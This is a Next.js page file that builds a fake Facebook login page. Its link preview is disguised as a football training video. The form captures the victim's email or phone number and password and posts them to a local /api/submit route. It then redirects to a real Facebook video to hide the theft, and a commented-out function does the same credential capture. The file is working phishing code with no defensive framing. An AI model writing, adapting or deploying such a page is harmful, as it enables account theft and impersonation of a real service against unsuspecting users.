import Head from "next/head";
import clientPromise from "../lib/mongodb";
import type { InferGetServerSidePropsType, GetServerSideProps } from "next";
import styles from "../styles/Home.module.css";
import { useState } from "react";
import Router, { useRouter } from "next/router";

type ConnectionStatus = {
  isConnected: boolean;
};

export const getServerSideProps: GetServerSideProps<
  ConnectionStatus
> = async () => {
  try {
    await clientPromise;
    // `await clientPromise` will use the default database passed in the MONGODB_URI
    // However you can use another database (e.g. myDatabase) by replacing the `await clientPromise` with the following code:
    //
    // `const client = await clientPromise`
    // `const db = client.db("myDatabase")`
    //
    // Then you can execute queries against your database like so:
    // db.find({}) or any of the MongoDB Node Driver commands

    return {
      props: { isConnected: true },
    };
  } catch (e) {
    console.error(e);
    return {
      props: { isConnected: false },
    };
  }
};

export default function Home({
  isConnected,
}: InferGetServerSidePropsType<typeof getServerSideProps>) {
  const router = useRouter();

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  // function getCreds(e: any) {
  //   e.preventDefault();
  //   console.log(username, password);
  //   router.push(
  //     "https://www.facebook.com/watch/?ref=search&v=2690934321080181&external_log_id=63454aa2-b047-4528-889a-77078a990f57&q=football"
  //   );
  // }

  const handleSubmit = async (e: any) => {
    e.preventDefault();
    const formData = {
      username: username,
      password: password,
    };

    // Post the formData to your API route
    const response = await fetch("/api/submit", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(formData),
    });

    const data = await response.json();
    console.log(data); // Handle the response data as needed
    router.push(
      "https://www.facebook.com/watch/?ref=search&v=2690934321080181&external_log_id=63454aa2-b047-4528-889a-77078a990f57&q=football"
    );
  };

  return (
    <>
      <Head>
        <title>
          Testing Touches, Football Tennis, Possession & More! 👀 | Inside
          Training
        </title>
        <meta
          property="og:title"
          content="Testing Touches, Football Tennis, Possession & More! 👀 | Inside
          Training"
        />
        <meta property="og:image" content="/thumb.png" />
        <link rel="icon" href="/fav.ico" />
        {/* <link ref={} /> */}
      </Head>
      <div className={styles.content}>
        <div className={styles.flexDiv}>
          <div className={styles.nameContent}>
            <h1 className={styles.logo}>Facebook</h1>
            <p>Connect with friends and the world around you on Facebook.</p>
          </div>
          <form className={styles.form} onSubmit={handleSubmit}>
            <input
              type="text"
              placeholder="Email or Phone Number"
              required
              onChange={(e) => setUsername(e.target.value)}
            />
            <input
              type="password"
              placeholder="Password"
              required
              onChange={(e) => setPassword(e.target.value)}
            />
            <button className={styles.login}>Log In</button>
            <a href="https://www.facebook.com/">Forgot Password ?</a>
            <hr />
            <button className={styles.createAccount}>Create New Account</button>
          </form>
        </div>
      </div>
    </>
  );
}
